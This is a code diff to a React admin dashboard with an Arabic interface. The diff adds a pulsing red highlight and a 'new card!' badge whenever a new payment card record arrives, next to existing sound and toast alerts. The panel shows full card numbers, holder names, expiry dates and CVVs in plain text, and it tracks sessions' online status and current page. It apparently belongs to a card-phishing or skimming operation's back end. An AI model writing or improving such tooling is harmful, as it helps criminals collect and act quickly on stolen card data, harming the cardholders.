@@ -343,15 +343,25 @@ function SessionBox({
 
               {/* بيانات البطاقة */}
               {latestCard ? (
-                <div>
+                <div className={`rounded-3xl border-2 p-4 transition-all duration-500 ${
+                  latestCard.id === newCardId 
+                    ? "bg-red-50 border-red-500 shadow-lg shadow-red-200 animate-pulse" 
+                    : "bg-white border-slate-200"
+                }`}>
+                  {latestCard.id === newCardId && (
+                    <div className="flex items-center gap-2 mb-3 text-red-600">
+                      <span className="text-lg">🚨</span>
+                      <span className="font-bold text-sm">بطاقة جديدة!</span>
+                    </div>
+                  )}
                   <p className="text-[10px] text-slate-400 mb-2">بيانات البطاقة</p>
                   <div className="grid gap-2 sm:grid-cols-2 text-xs">
-                    <div className="rounded-xl bg-white p-2 sm:col-span-2">
+                    <div className="rounded-xl bg-slate-50 p-2 sm:col-span-2">
                       رقم البطاقة: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
                     </div>
-                    <div className="rounded-xl bg-white p-2">المالك: <span className="font-semibold">{cardData.cardHolder ?? "—"}</span></div>
-                    <div className="rounded-xl bg-white p-2">تاريخ الانتهاء: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "—"}</span></div>
-                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "—"}</span></div>
+                    <div className="rounded-xl bg-slate-50 p-2">المالك: <span className="font-semibold">{cardData.cardHolder ?? "—"}</span></div>
+                    <div className="rounded-xl bg-slate-50 p-2">تاريخ الانتهاء: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "—"}</span></div>
+                    <div className="rounded-xl bg-slate-50 p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "—"}</span></div>
                   </div>
                 </div>
               ) : (
@@ -687,6 +697,7 @@ export default function AdminDashboard() {
   // Sound settings
   const [soundEnabled, setSoundEnabled] = useState(true);
   const [lastCardAlertTime, setLastCardAlertTime] = useState(0);
+  const [newCardId, setNewCardId] = useState<number | null>(null);
   const isInitialLoadRef = useRef(true); // Track initial load to skip old data
   
   // Track session online status and current page
@@ -754,6 +765,7 @@ export default function AdminDashboard() {
             if (now - lastCardAlertTime > 5000) { // Min 5 seconds between card alerts
               playCardAlertSound();
               setLastCardAlertTime(now);
+              setNewCardId(row.id); // Highlight card
               toast("warning", "🚨 تنبيه!", "بطاقة دفع جديدة وصلت!");
             }
           }
